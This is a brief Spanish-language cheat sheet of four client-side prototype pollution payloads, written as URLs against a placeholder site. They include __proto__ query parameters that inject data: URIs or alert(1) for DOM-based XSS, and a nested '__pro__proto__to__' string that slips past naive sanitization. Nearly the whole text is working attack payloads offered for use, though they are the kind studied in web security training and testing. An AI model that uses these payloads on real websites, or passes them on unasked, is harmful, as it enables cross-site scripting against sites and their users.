---

### 💥 **Prototype Pollution Cheat Sheet** 💥

---
---
### **1. Prototype pollution en el lado cliente usando APIs del navegador**
```http
https://site.com/?__proto__[value]=data:,alert(1)
```

### **2. XSS en el DOM por prototype pollution en cliente**

```http
https://site.com/?__proto__[transport_url]=data:,alert(1)
```

### **3. XSS en el DOM con vector alternativo de pollution**

```http
https://site.com/?__proto__.sequence=alert(1)-
```

### **4. Prototype pollution en cliente por mala sanitización**

```http
https://site.com/?__pro__proto__to__[value]=kike123

```